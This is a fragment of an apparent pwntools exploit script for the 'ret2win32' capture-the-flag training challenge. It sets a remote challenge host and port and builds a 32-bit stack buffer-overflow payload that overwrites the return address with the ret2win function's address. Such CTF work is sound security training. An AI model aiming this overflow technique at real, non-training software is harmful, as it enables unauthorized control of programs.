...
#########################################################
BINARY="./ret2win32"   # path to the binary file
ENV={}      # list of enviroment variables, useful if you need to use a given library
GDB=""      # commands to execute if you debug using gdb
HOST="cyberchallenge.diag.uniroma1.it"     # host for remote connection
PORT=5014   # port for remote connection 
#########################################################
...
log.info(f'ret2win address:{hex(ret2win)}')

payload = b'A'*0x28 + b'BBBB' + p32(ret2win)
